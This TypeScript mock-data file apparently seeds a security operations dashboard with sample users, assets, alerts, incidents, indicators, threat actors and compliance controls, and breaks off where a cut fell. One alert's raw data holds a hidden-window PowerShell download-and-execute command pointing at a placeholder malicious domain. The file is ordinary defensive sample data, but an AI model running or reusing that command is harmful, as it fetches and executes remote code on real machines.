import { 
  Alert, Incident, Asset, SecurityEvent, DashboardStats, TimelineEvent, User,
  IOC, ThreatActor, Campaign, SecurityMetrics, ComplianceFramework,
  UserActivity, UserSession, SystemSettings, AlertRule,
  Playbook, Vulnerability, AIAgent, AgentActivity, SOCTeam,
  AIFalsePositiveEvent, AIDecisionInsight, Notification
} from '../types';

// Mock Users
export const mockUsers: User[] = [
  {
    id: '1',
    username: 'admin',
    email: 'admin@opensoc.local',
    firstName: 'System',
    lastName: 'Administrator',
    role: 'admin'
  },
  {
    id: '2',
    username: 'jsmith',
    email: 'j.smith@company.com',
    firstName: 'John',
    lastName: 'Smith',
    role: 'analyst'
  },
  {
    id: '3',
    username: 'mwilson',
    email: 'm.wilson@company.com',
    firstName: 'Maria',
    lastName: 'Wilson',
    role: 'analyst'
  }
];

// Mock Assets
export const mockAssets: Asset[] = [
  {
    id: 'asset-1',
    name: 'DC-SERVER-01',
    assetType: 'server',
    ipAddress: '10.0.1.10',
    hostname: 'dc-server-01.company.local',
    osType: 'Windows Server 2022',
    osVersion: '21H2',
    criticality: 'critical',
    organizationId: 'org-1',
    metadata: { department: 'IT', owner: 'John Smith' },
    isActive: true,
    status: 'active',
    vulnerabilityCount: 2,
    riskScore: 85,
    location: 'Data Center A',
    owner: 'IT Department',
    lastSeen: new Date('2024-01-15T10:30:00Z'),
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:30:00Z')
  },
  {
    id: 'asset-2',
    name: 'WEB-SERVER-01',
    assetType: 'server',
    ipAddress: '10.0.1.20',
    hostname: 'web-server-01.company.local',
    osType: 'Ubuntu Server 22.04',
    osVersion: '22.04.3',
    criticality: 'high',
    organizationId: 'org-1',
    metadata: { department: 'IT', owner: 'Maria Wilson' },
    isActive: true,
    status: 'active',
    vulnerabilityCount: 1,
    riskScore: 65,
    location: 'Data Center A',
    owner: 'IT Department',
    lastSeen: new Date('2024-01-15T10:25:00Z'),
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:25:00Z')
  },
  {
    id: 'asset-3',
    name: 'FIREWALL-01',
    assetType: 'network_device',
    ipAddress: '10.0.0.1',
    hostname: 'firewall-01.company.local',
    osType: 'FortiOS',
    osVersion: '7.4.1',
    criticality: 'critical',
    organizationId: 'org-1',
    metadata: { vendor: 'Fortinet', model: 'FortiGate 100F' },
    isActive: true,
    status: 'active',
    vulnerabilityCount: 0,
    riskScore: 95,
    location: 'Network Closet',
    owner: 'Network Team',
    lastSeen: new Date('2024-01-15T10:35:00Z'),
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:35:00Z')
  },
  {
    id: 'asset-4',
    name: 'LAPTOP-JSMITH',
    assetType: 'workstation',
    ipAddress: '10.0.2.15',
    hostname: 'laptop-jsmith.company.local',
    osType: 'Windows 11 Pro',
    osVersion: '23H2',
    criticality: 'medium',
    organizationId: 'org-1',
    metadata: { user: 'jsmith', department: 'Finance' },
    isActive: true,
    status: 'active',
    vulnerabilityCount: 3,
    riskScore: 45,
    location: 'Remote',
    owner: 'John Smith',
    lastSeen: new Date('2024-01-15T09:15:00Z'),
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T09:15:00Z')
  },
  {
    id: 'asset-5',
    name: 'DB-SERVER-01',
    assetType: 'server',
    ipAddress: '10.0.1.30',
    hostname: 'db-server-01.company.local',
    osType: 'CentOS 8',
    osVersion: '8.5',
    criticality: 'critical',
    organizationId: 'org-1',
    metadata: { database: 'PostgreSQL 14', department: 'IT' },
    isActive: true,
    status: 'maintenance',
    vulnerabilityCount: 0,
    riskScore: 75,
    location: 'Data Center B',
    owner: 'Database Team',
    lastSeen: new Date('2024-01-15T08:00:00Z'),
    createdAt: new Date('2024-01-15T08:00:00Z'),
    updatedAt: new Date('2024-01-15T08:00:00Z')
  }
];

// Timeline events for incidents
const mockTimelineEvents: TimelineEvent[] = [
  {
    id: 'timeline-1',
    timestamp: new Date('2024-01-15T10:00:00Z'),
    type: 'alert',
    title: 'Malware Detection Alert',
    description: 'Suspicious file detected on DC-SERVER-01',
    userId: '1',
    userName: 'System Administrator'
  },
  {
    id: 'timeline-2',
    timestamp: new Date('2024-01-15T10:05:00Z'),
    type: 'action',
    title: 'Incident Created',
    description: 'Automatic incident created from critical alert',
    userId: '1',
    userName: 'System Administrator'
  },
  {
    id: 'timeline-3',
    timestamp: new Date('2024-01-15T10:10:00Z'),
    type: 'action',
    title: 'Asset Quarantined',
    description: 'DC-SERVER-01 isolated from network',
    userId: '2',
    userName: 'John Smith'
  }
];

// Mock Alerts
export const mockAlerts: Alert[] = [
  {
    id: 'alert-1',
    title: 'Malware Detection: Suspicious PowerShell Activity',
    description: 'Detected suspicious PowerShell execution attempting to download external payloads',
    severity: 5,
    status: 'new',
    sourceSystem: 'Windows Defender ATP',
    eventTime: new Date('2024-01-15T10:30:00Z'),
    assetId: 'asset-1',
    assetName: 'DC-SERVER-01',
    organizationId: 'org-1',
    rawData: {
      processName: 'powershell.exe',
      commandLine: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious-site.com/payload\')"',
      parentProcess: 'winlogon.exe',
      userId: 'SYSTEM'
    },
    enrichmentData: {
      mitreTactics: ['Initial Access', 'Execution'],
      mitreT1059: 'Command and Scripting Interpreter: PowerShell',
      riskScore: 95,
      iocMatches: ['malicious-site.com']
    },
    assignedAgent: 'SOC Analyst Agent',
    createdAt: new Date('2024-01-15T10:30:00Z'),
    updatedAt: new Date('2024-01-15T10:30:00Z')
  },
  {
    id: 'alert-2',
    title: 'Multiple Failed Login Attempts',
    description: 'Detected 15 failed login attempts from external IP in 5 minutes',
    severity: 4,
    status: 'investigating',
    sourceSystem: 'Windows Event Logs',
    eventTime: new Date('2024-01-15T10:15:00Z'),
    assetId: 'asset-1',
    assetName: 'DC-SERVER-01',
    organizationId: 'org-1',
    rawData: {
      sourceIp: '203.0.113.45',
      targetUser: 'administrator',
      failureReason: 'Invalid credentials',
      attemptCount: 15
    },
    enrichmentData: {
      geoLocation: 'China',
      reputation: 'Known malicious IP',
      riskScore: 85,
      iocMatches: ['203.0.113.45']
    },
    assignedAgent: 'SOC Analyst Agent',
    createdAt: new Date('2024-01-15T10:15:00Z'),
    updatedAt: new Date('2024-01-15T10:20:00Z')
  },
  {
    id: 'alert-3',
    title: 'Suspicious Network Traffic',
    description: 'Unusual outbound traffic pattern detected to known C2 infrastructure',
    severity: 4,
    status: 'new',
    sourceSystem: 'Network IDS',
    eventTime: new Date('2024-01-15T10:25:00Z'),
    assetId: 'asset-2',
    assetName: 'WEB-SERVER-01',
    organizationId: 'org-1',
    rawData: {
      sourceIp: '10.0.1.20',
      destinationIp: '198.51.100.67',
      protocol: 'TCP',
      port: 443,
      bytesTransferred: 1048576
    },
    enrichmentData: {
      c2Category: 'Command and Control',
      threatFamily: 'Cobalt Strike',
      riskScore: 88,
      iocMatches: ['198.51.100.67']
    },
    assignedAgent: 'Threat Intelligence Agent',
    createdAt: new Date('2024-01-15T10:25:00Z'),
    updatedAt: new Date('2024-01-15T10:25:00Z')
  },
  {
    id: 'alert-4',
    title: 'File Integrity Monitoring Alert',
    description: 'Critical system file modified unexpectedly',
    severity: 3,
    status: 'resolved',
    sourceSystem: 'OSSEC',
    eventTime: new Date('2024-01-15T09:45:00Z'),
    assetId: 'asset-2',
    assetName: 'WEB-SERVER-01',
    organizationId: 'org-1',
    rawData: {
      filePath: '/etc/passwd',
      action: 'modified',
      oldHash: 'a1b2c3d4e5f6',
      newHash: 'f6e5d4c3b2a1',
      modifier: 'root'
    },
    enrichmentData: {
      changeType: 'Authorized maintenance',
      approvedBy: 'System Administrator',
      riskScore: 25
    },
    assignedAgent: 'SOC Analyst Agent',
    createdAt: new Date('2024-01-15T09:45:00Z'),
    updatedAt: new Date('2024-01-15T09:50:00Z')
  },
  {
    id: 'alert-5',
    title: 'DDoS Attack Detection',
    description: 'High volume of requests from multiple sources targeting web server',
    severity: 4,
    status: 'investigating',
    sourceSystem: 'Web Application Firewall',
    eventTime: new Date('2024-01-15T10:20:00Z'),
    assetId: 'asset-2',
    assetName: 'WEB-SERVER-01',
    organizationId: 'org-1',
    rawData: {
      requestCount: 10000,
      timeWindow: '60 seconds',
      topSourceIps: ['203.0.113.10', '203.0.113.11', '203.0.113.12'],
      targetEndpoint: '/api/v1/login'
    },
    enrichmentData: {
      attackType: 'HTTP Flood',
      botnetFamily: 'Mirai',
      riskScore: 78,
      mitigationActive: true
    },
    assignedAgent: 'Incident Response Agent',
    createdAt: new Date('2024-01-15T10:20:00Z'),
    updatedAt: new Date('2024-01-15T10:25:00Z')
  }
];

// Mock Incidents
export const mockIncidents: Incident[] = [
  {
    id: 'incident-1',
    title: 'Advanced Persistent Threat - Domain Controller Compromise',
    description: 'Suspected APT activity targeting domain controller with multiple attack vectors',
    severity: 5,
    status: 'investigating',
    category: 'intrusion',
    assignedTo: '2',
    assignedToName: 'John Smith',
    organizationId: 'org-1',
    alertIds: ['alert-1', 'alert-2'],
    alertCount: 2,
    timeline: mockTimelineEvents,
    metadata: {
      attackVectors: ['PowerShell', 'Credential Stuffing'],
      affectedAssets: ['asset-1'],
      estimatedImpact: 'High',
      containmentActions: ['Network isolation', 'Password reset']
    },
    createdAt: new Date('2024-01-15T10:00:00Z'),
    updatedAt: new Date('2024-01-15T10:30:00Z')
  },
  {
    id: 'incident-2',
    title: 'Web Server Compromise - Multiple Attack Indicators',
    description: 'Web server showing signs of compromise with suspicious network traffic and potential data exfiltration',
    severity: 4,
    status: 'contained',
    category: 'data_breach',
    assignedTo: '3',
    assignedToName: 'Maria Wilson',
    organizationId: 'org-1',
    alertIds: ['alert-3', 'alert-5'],
    alertCount: 2,
    timeline: [
      {
        id: 'timeline-4',
        timestamp: new Date('2024-01-15T09:30:00Z'),
        type: 'alert',
        title: 'Initial Detection',
        description: 'Suspicious network traffic detected',
        userId: '1',
        userName: 'System Administrator'
      },
      {
        id: 'timeline-5',
        timestamp: new Date('2024-01-15T09:45:00Z'),
        type: 'action',
        title: 'Investigation Started',
        description: 'Assigned to security analyst for investigation',
        userId: '3',
        userName: 'Maria Wilson'
      },
      {
        id: 'timeline-6',
        timestamp: new Date('2024-01-15T10:00:00Z'),
        type: 'action',
        title: 'Threat Contained',
        description: 'Malicious traffic blocked at firewall level',
        userId: '3',
        userName: 'Maria Wilson'
      }
    ],
    metadata: {
      attackVectors: ['Web Application Exploit', 'C2 Communication'],
      affectedAssets: ['asset-2'],
      estimatedImpact: 'Medium',
      containmentActions: ['Traffic blocking', 'System isolation', 'Patch deployment']
    },
    createdAt: new Date('2024-01-15T09:30:00Z'),
    updatedAt: new Date('2024-01-15T10:15:00Z')
  },
  {
    id: 'incident-3',
    title: 'Policy Violation - Unauthorized Software Installation',
    description: 'Unauthorized software detected on workstation violating corporate security policy',
    severity: 2,
    status: 'resolved',
    category: 'policy_violation',
    assignedTo: '2',
    assignedToName: 'John Smith',
    organizationId: 'org-1',
    alertIds: ['alert-4'],
    alertCount: 1,
    timeline: [
      {
        id: 'timeline-7',
        timestamp: new Date('2024-01-15T08:00:00Z'),
        type: 'alert',
        title: 'Policy Violation Detected',
        description: 'Unauthorized software installation detected',
        userId: '1',
        userName: 'System Administrator'
      },
      {
        id: 'timeline-8',
        timestamp: new Date('2024-01-15T08:30:00Z'),
        type: 'action',
        title: 'User Contacted',
        description: 'Employee contacted about policy violation',
        userId: '2',
        userName: 'John Smith'
      },
      {
        id: 'timeline-9',
        timestamp: new Date('2024-01-15T09:00:00Z'),
        type: 'action',
        title: 'Software Removed',
        description: 'Unauthorized software uninstalled',
        userId: '2',
        userName: 'John Smith'
      }
    ],
    metadata: {
      violationType: 'Unauthorized Software',
      affectedAssets: ['asset-4'],
      policyReference: 'SEC-POL-001',
      remedialAction: 'Software removal and user training'
    },
    resolvedAt: new Date('2024-01-15T09:15:00Z'),
    createdAt: new Date('2024-01-15T08:00:00Z'),
    updatedAt: new Date('2024-01-15T09:15:00Z')
  }
];

// Mock Security Events for timeline/feed
export const mockSecurityEvents: SecurityEvent[] = [
  {
    id: 'event-1',
    eventTime: new Date('2024-01-15T10:35:00Z'),
    source: 'Windows Event Log',
    eventType: 'Authentication Failure',
    severity: 3,
    sourceIp: '10.0.2.15',
    userName: 'jsmith',
    assetId: 'asset-4',
    assetName: 'LAPTOP-JSMITH',
    rawLog: 'EventID:4625 An account failed to log on. Subject: Security ID: NULL SID Account Name: - Account Domain: - Logon ID: 0x0',
    parsedData: {
      eventId: 4625,
      logonType: 2,
      failureReason: 'Unknown user name or bad password',
      sourceWorkstation: 'LAPTOP-JSMITH'
    },
    organizationId: 'org-1',
    createdAt: new Date('2024-01-15T10:35:00Z')
  },
  {
    id: 'event-2',
    eventTime: new Date('2024-01-15T10:34:00Z'),
    source: 'Firewall',
    eventType: 'Connection Blocked',
    severity: 2,
    sourceIp: '203.0.113.99',
    destinationIp: '10.0.1.20',
    assetId: 'asset-3',
    assetName: 'FIREWALL-01',
    rawLog: 'action=deny src=203.0.113.99 dst=10.0.1.20 port=22 proto=tcp rule=BLOCK_SSH_EXTERNAL',
    parsedData: {
      action: 'deny',
      protocol: 'tcp',
      destinationPort: 22,
      rule: 'BLOCK_SSH_EXTERNAL'
    },
    organizationId: 'org-1',
    createdAt: new Date('2024-01-15T10:34:00Z')
  },
  {
    id: 'event-3',
    eventTime: new Date('2024-01-15T10:33:00Z'),
    source: 'Antivirus',
    eventType: 'Malware Detected',
    severity: 4,
    sourceIp: '10.0.1.10',
    assetId: 'asset-1',
    assetName: 'DC-SERVER-01',
    rawLog: 'Threat detected: Trojan:Win32/Emotet.A!cl in C:\\Windows\\Temp\\suspicious.exe',
    parsedData: {
      threatName: 'Trojan:Win32/Emotet.A!cl',
      filePath: 'C:\\Windows\\Temp\\suspicious.exe',
      action: 'Quarantined',
      confidence: 'High'
    },
    organizationId: 'org-1',
    createdAt: new Date('2024-01-15T10:33:00Z')
  }
];

// Mock Dashboard Stats
export const mockDashboardStats: DashboardStats = {
  totalAlerts: 47,
  newAlerts: 8,
  criticalAlerts: 3,
  activeIncidents: 2,
  resolvedIncidents: 15,
  totalAssets: 87,
  onlineAssets: 84,
  offlineAssets: 2,
  compromisedAssets: 1,
  averageResponseTime: 12.5, // minutes
  threatLevel: 'high',
  systemHealth: 'warning'
};

// Mock IOCs (Indicators of Compromise)
export const mockIOCs: IOC[] = [
  {
    id: 'ioc-1',
    type: 'ip',
    value: '203.0.113.45',
    confidence: 'high',
    severity: 5,
    description: 'Known malicious IP associated with APT28 group',
    source: 'Threat Intel Feed',
    tags: ['apt28', 'credential-harvesting', 'c2'],
    firstSeen: new Date('2024-01-10T00:00:00Z'),
    lastSeen: new Date('2024-01-15T10:15:00Z'),
    isActive: true,
    relatedCampaign: 'campaign-1',
    mitreAttack: ['T1071.001'],
    createdAt: new Date('2024-01-10T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:15:00Z')
  },
  {
    id: 'ioc-2',
    type: 'domain',
    value: 'malicious-site.com',
    confidence: 'very_high',
    severity: 5,
    description: 'Command and control domain used in PowerShell-based attacks',
    source: 'Internal Analysis',
    tags: ['powershell', 'c2', 'malware-distribution'],
    firstSeen: new Date('2024-01-12T00:00:00Z'),
    lastSeen: new Date('2024-01-15T10:30:00Z'),
    isActive: true,
    relatedCampaign: 'campaign-2',
    mitreAttack: ['T1059.001', 'T1071.001'],
    createdAt: new Date('2024-01-12T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:30:00Z')
  },
  {
    id: 'ioc-3',
    type: 'file_hash',
    value: 'a1b2c3d4e5f67890abcdef1234567890',
    confidence: 'high',
    severity: 4,
    description: 'SHA-256 hash of Emotet trojan variant',
    source: 'VirusTotal',
    tags: ['emotet', 'trojan', 'banking-malware'],
    firstSeen: new Date('2024-01-14T00:00:00Z'),
    lastSeen: new Date('2024-01-15T10:33:00Z'),
    isActive: true,
    mitreAttack: ['T1204.002', 'T1566.001'],
    createdAt: new Date('2024-01-14T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:33:00Z')
  },
  {
    id: 'ioc-4',
    type: 'ip',
    value: '198.51.100.67',
    confidence: 'medium',
    severity: 4,
    description: 'Suspected Cobalt Strike C2 server',
    source: 'Hybrid Analysis',
    tags: ['cobalt-strike', 'c2', 'post-exploitation'],
    firstSeen: new Date('2024-01-13T00:00:00Z'),
    lastSeen: new Date('2024-01-15T10:25:00Z'),
    isActive: true,
    mitreAttack: ['T1071.001', 'T1105'],
    createdAt: new Date('2024-01-13T00:00:00Z'),
    updatedAt: new Date('2024-01-15T10:25:00Z')
  },
  {
    id: 'ioc-5',
    type: 'email',
    value: 'phishing@suspicious-domain.net',
    confidence: 'high',
    severity: 3,
    description: 'Email address used in credential phishing campaigns',
    source: 'Email Security Gateway',
    tags: ['phishing', 'credential-theft', 'social-engineering'],
    firstSeen: new Date('2024-01-09T00:00:00Z'),
    lastSeen: new Date('2024-01-14T00:00:00Z'),
    isActive: false,
    mitreAttack: ['T1566.002'],
    createdAt: new Date('2024-01-09T00:00:00Z'),
    updatedAt: new Date('2024-01-14T00:00:00Z')
  }
];

// Mock Threat Actors
export const mockThreatActors: ThreatActor[] = [
  {
    id: 'actor-1',
    name: 'APT28',
    aliases: ['Fancy Bear', 'Sofacy', 'Strontium'],
    description: 'Russian military intelligence cyber espionage group',
    motivation: ['espionage', 'information-gathering'],
    sophistication: 'advanced',
    origin: 'Russia',
    targetSectors: ['government', 'military', 'aerospace', 'defense'],
    techniques: ['T1566.001', 'T1071.001', 'T1059.001', 'T1053.005'],
    campaigns: ['campaign-1'],
    isActive: true,
    firstSeen: new Date('2020-01-01T00:00:00Z'),
    lastSeen: new Date('2024-01-15T00:00:00Z'),
    createdAt: new Date('2020-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T00:00:00Z')
  },
  {
    id: 'actor-2',
    name: 'Lazarus Group',
    aliases: ['APT38', 'ZINC', 'Hidden Cobra'],
    description: 'North Korean state-sponsored cybercriminal organization',
    motivation: ['financial-gain', 'espionage', 'sabotage'],
    sophistication: 'expert',
    origin: 'North Korea',
    targetSectors: ['financial', 'cryptocurrency', 'entertainment', 'government'],
    techniques: ['T1566.001', 'T1204.002', 'T1105', 'T1027'],
    campaigns: ['campaign-3'],
    isActive: true,
    firstSeen: new Date('2019-01-01T00:00:00Z'),
    lastSeen: new Date('2024-01-10T00:00:00Z'),
    createdAt: new Date('2019-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-10T00:00:00Z')
  },
  {
    id: 'actor-3',
    name: 'Conti Ransomware Group',
    aliases: ['Conti', 'Wizard Spider'],
    description: 'Russian-speaking ransomware-as-a-service operation',
    motivation: ['financial-gain'],
    sophistication: 'advanced',
    origin: 'Russia',
    targetSectors: ['healthcare', 'manufacturing', 'government', 'education'],
    techniques: ['T1566.001', 'T1486', 'T1083', 'T1005'],
    campaigns: ['campaign-2'],
    isActive: false,
    firstSeen: new Date('2020-08-01T00:00:00Z'),
    lastSeen: new Date('2023-06-01T00:00:00Z'),
    createdAt: new Date('2020-08-01T00:00:00Z'),
    updatedAt: new Date('2023-06-01T00:00:00Z')
  }
];

// Mock Campaigns
export const mockCampaigns: Campaign[] = [
  {
    id: 'campaign-1',
    name: 'Operation CloudHopper 2024',
    description: 'Sophisticated spear-phishing campaign targeting government entities',
    threatActor: 'APT28',
    startDate: new Date('2024-01-01T00:00:00Z'),
    isActive: true,
    targetSectors: ['government', 'defense'],
    techniques: ['T1566.001', 'T1071.001', 'T1059.001'],
    iocs: ['ioc-1'],
    affectedAssets: 15,
    severity: 5,
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-15T00:00:00Z')
  },
  {
    id: 'campaign-2',
    name: 'PowerShell Empire Revival',
    description: 'Malware distribution campaign using PowerShell-based payloads',
    threatActor: 'Conti Ransomware Group',
    startDate: new Date('2024-01-10T00:00:00Z'),
    endDate: new Date('2024-01-14T00:00:00Z'),
    isActive: false,
    targetSectors: ['healthcare', 'manufacturing'],
    techniques: ['T1059.001', 'T1486', 'T1083'],
    iocs: ['ioc-2'],
    affectedAssets: 8,
    severity: 4,
    createdAt: new Date('2024-01-10T00:00:00Z'),
    updatedAt: new Date('2024-01-14T00:00:00Z')
  },
  {
    id: 'campaign-3',
    name: 'CryptoHeist 2024',
    description: 'Cryptocurrency theft campaign targeting financial institutions',
    threatActor: 'Lazarus Group',
    startDate: new Date('2023-12-01T00:00:00Z'),
    isActive: true,
    targetSectors: ['financial', 'cryptocurrency'],
    techniques: ['T1566.001', 'T1204.002', 'T1105'],
    iocs: [],
    affectedAssets: 23,
    severity: 5,
    createdAt: new Date('2023-12-01T00:00:00Z'),
    updatedAt: new Date('2024-01-10T00:00:00Z')
  }
];

// Mock Security Metrics for Analytics
export const mockSecurityMetrics: SecurityMetrics = {
  alertTrends: [
    { date: '2024-01-08', total: 45, critical: 2, high: 8, medium: 20, low: 15 },
    { date: '2024-01-09', total: 38, critical: 1, high: 6, medium: 18, low: 13 },
    { date: '2024-01-10', total: 52, critical: 3, high: 12, medium: 22, low: 15 },
    { date: '2024-01-11', total: 41, critical: 2, high: 7, medium: 19, low: 13 },
    { date: '2024-01-12', total: 47, critical: 4, high: 9, medium: 21, low: 13 },
    { date: '2024-01-13', total: 35, critical: 1, high: 5, medium: 16, low: 13 },
    { date: '2024-01-14', total: 43, critical: 2, high: 8, medium: 19, low: 14 },
    { date: '2024-01-15', total: 47, critical: 3, high: 10, medium: 20, low: 14 }
  ],
  incidentTrends: [
    { date: '2024-01-08', total: 5, resolved: 3, open: 2 },
    { date: '2024-01-09', total: 3, resolved: 2, open: 1 },
    { date: '2024-01-10', total: 7, resolved: 4, open: 3 },
    { date: '2024-01-11', total: 4, resolved: 3, open: 1 },
    { date: '2024-01-12', total: 6, resolved: 4, open: 2 },
    { date: '2024-01-13', total: 2, resolved: 1, open: 1 },
    { date: '2024-01-14', total: 5, resolved: 3, open: 2 },
    { date: '2024-01-15', total: 3, resolved: 1, open: 2 }
  ],
  mttrData: [
    { date: '2024-01-08', value: 15.2 },
    { date: '2024-01-09', value: 12.8 },
    { date: '2024-01-10', value: 18.5 },
    { date: '2024-01-11', value: 11.2 },
    { date: '2024-01-12', value: 14.7 },
    { date: '2024-01-13', value: 9.3 },
    { date: '2024-01-14', value: 13.1 },
    { date: '2024-01-15', value: 12.5 }
  ],
  topThreats: [
    { name: 'Malware', count: 127, trend: 15 },
    { name: 'Phishing', count: 89, trend: -8 },
    { name: 'Brute Force', count: 76, trend: 23 },
    { name: 'DDoS', count: 45, trend: -12 },
    { name: 'Data Exfiltration', count: 32, trend: 7 }
  ],
  attackVectors: [
    { vector: 'Email', count: 156, percentage: 42 },
    { vector: 'Web Application', count: 89, percentage: 24 },
    { vector: 'Network', count: 67, percentage: 18 },
    { vector: 'USB/Removable Media', count: 34, percentage: 9 },
    { vector: 'Social Engineering', count: 26, percentage: 7 }
  ],
  mitreAttack: [
    { tactic: 'Initial Access', techniques: 12, coverage: 85 },
    { tactic: 'Execution', techniques: 15, coverage: 78 },
    { tactic: 'Persistence', techniques: 19, coverage: 65 },
    { tactic: 'Privilege Escalation', techniques: 13, coverage: 72 },
    { tactic: 'Defense Evasion', techniques: 25, coverage: 58 },
    { tactic: 'Credential Access', techniques: 16, coverage: 81 },
    { tactic: 'Discovery', techniques: 18, coverage: 67 },
    { tactic: 'Lateral Movement', techniques: 9, coverage: 89 },
    { tactic: 'Collection', techniques: 11, coverage: 73 },
    { tactic: 'Command and Control', techniques: 8, coverage: 92 },
    { tactic: 'Exfiltration', techniques: 7, coverage: 86 },
    { tactic: 'Impact', techniques: 10, coverage: 70 }
  ]
};

// Mock Compliance Framework
export const mockComplianceFrameworks: ComplianceFramework[] = [
  {
    id: 'framework-1',
    name: 'SOC 2 Type II',
    description: 'Service Organization Control 2 Type II compliance framework',
    version: '2017',
    controls: [
      {
        id: 'control-1',
        name: 'CC6.1',
        description: 'The entity implements logical access security measures',
        requirement: 'Logical access security software, infrastructure, and architectures over protected information assets',
        status: 'compliant',
        score: 95,
        evidence: ['access-control-policy.pdf', 'user-access-review.xlsx'],
        lastReview: new Date('2024-01-10T00:00:00Z'),
        nextReview: new Date('2024-04-10T00:00:00Z'),
        owner: 'Security Team',
        notes: 'All controls implemented and tested'
      },
      {
        id: 'control-2',
        name: 'CC6.2',
        description: 'Prior to issuing system credentials, the entity verifies the identity of the credential recipient',
        requirement: 'Identity verification procedures for credential issuance',
        status: 'partial',
        score: 75,
        evidence: ['identity-verification-process.pdf'],
        lastReview: new Date('2024-01-05T00:00:00Z'),
        nextReview: new Date('2024-02-05T00:00:00Z'),
        owner: 'IT Operations',
        notes: 'Enhanced verification process in development'
      }
    ],
    overallScore: 85,
    lastAssessment: new Date('2024-01-01T00:00:00Z'),
    nextAssessment: new Date('2024-07-01T00:00:00Z'),
    isActive: true
  },
  {
    id: 'framework-2',
    name: 'NIST Cybersecurity Framework',
    description: 'National Institute of Standards and Technology Cybersecurity Framework',
    version: '1.1',
    controls: [
      {
        id: 'control-3',
        name: 'ID.AM-1',
        description: 'Physical devices and systems within the organization are inventoried',
        requirement: 'Asset inventory management system',
        status: 'compliant',
        score: 90,
        evidence: ['asset-inventory.xlsx', 'discovery-scan-results.pdf'],
        lastReview: new Date('2024-01-12T00:00:00Z'),
        nextReview: new Date('2024-04-12T00:00:00Z'),
        owner: 'IT Operations',
        notes: 'Automated discovery tools in place'
      },
      {
        id: 'control-4',
        name: 'PR.AC-1',
        description: 'Identities and credentials are managed for authorized devices',
        requirement: 'Identity and credential management for devices',
        status: 'non_compliant',
        score: 45,
        evidence: [],
        lastReview: new Date('2024-01-08T00:00:00Z'),
        nextReview: new Date('2024-02-08T00:00:00Z'),
        owner: 'Security Team',
        notes: 'Device certificate management needs implementation'
      }
    ],
    overallScore: 67,
    lastAssessment: new Date('2023-12-15T00:00:00Z'),
    nextAssessment: new Date('2024-06-15T00:00:00Z'),
    isActive: true
  }
];

// Mock User Activities
export const mockUserActivities: UserActivity[] = [
  {
    id: 'activity-1',
    userId: '2',
    userName: 'John Smith',
    action: 'Alert Investigation',
    resource: 'Alert',
    resourceId: 'alert-1',
    ipAddress: '10.0.2.15',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    timestamp: new Date('2024-01-15T10:25:00Z'),
    details: { severity: 5, status_change: 'new -> investigating' }
  },
  {
    id: 'activity-2',
    userId: '3',
    userName: 'Maria Wilson',
    action: 'Incident Created',
    resource: 'Incident',
    resourceId: 'incident-2',
    ipAddress: '10.0.2.22',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    timestamp: new Date('2024-01-15T09:30:00Z'),
    details: { severity: 4, category: 'data_breach' }
  },
  {
    id: 'activity-3',
    userId: '1',
    userName: 'System Administrator',
    action: 'System Settings Updated',
    resource: 'Settings',
    resourceId: 'setting-alert-threshold',
    ipAddress: '10.0.1.5',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    timestamp: new Date('2024-01-15T08:45:00Z'),
    details: { setting: 'alert_threshold', old_value: 100, new_value: 75 }
  }
];

// Mock User Sessions
export const mockUserSessions: UserSession[] = [
  {
    id: 'session-1',
    userId: '1',
    userName: 'System Administrator',
    ipAddress: '10.0.1.5',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    startTime: new Date('2024-01-15T08:00:00Z'),
    lastActivity: new Date('2024-01-15T10:35:00Z'),
    isActive: true,
    location: 'New York, US'
  },
  {
    id: 'session-2',
    userId: '2',
    userName: 'John Smith',
    ipAddress: '10.0.2.15',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    startTime: new Date('2024-01-15T09:00:00Z'),
    lastActivity: new Date('2024-01-15T10:30:00Z'),
    isActive: true,
    location: 'Remote - Home Office'
  },
  {
    id: 'session-3',
    userId: '3',
    userName: 'Maria Wilson',
    ipAddress: '192.168.1.100',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    startTime: new Date('2024-01-15T07:30:00Z'),
    lastActivity: new Date('2024-01-15T09:45:00Z'),
    isActive: false,
    location: 'Boston, US'
  }
];

// Mock System Settings
export const mockSystemSettings: SystemSettings[] = [
  {
    id: 'setting-1',
    category: 'Alerting',
    name: 'Alert Threshold',
    value: 75,
    type: 'number',
    description: 'Minimum severity threshold for creating alerts',
    isEditable: true,
    updatedBy: 'System Administrator',
    updatedAt: new Date('2024-01-15T08:45:00Z')
  },
  {
    id: 'setting-2',
    category: 'Notifications',
    name: 'Email Notifications Enabled',
    value: true,
    type: 'boolean',
    description: 'Enable email notifications for critical alerts',
    isEditable: true,
    updatedBy: 'System Administrator',
    updatedAt: new Date('2024-01-10T00:00:00Z')
  },
  {
    id: 'setting-3',
    category: 'System',
    name: 'Session Timeout',
    value: 3600,
    type: 'number',
    description: 'User session timeout in seconds',
    isEditable: true,
    updatedBy: 'System Administrator',
    updatedAt: new Date('2024-01-01T00:00:00Z')
  },
  {
    id: 'setting-4',
    category: 'Security',
    name: 'MFA Required',
    value: true,
    type: 'boolean',
    description: 'Require multi-factor authentication for all users',
    isEditable: false,
    updatedBy: 'Security Team',
    updatedAt: new Date('2024-01-01T00:00:00Z')
  }
];

// Mock Alert Rules
export const mockAlertRules: AlertRule[] = [
  {
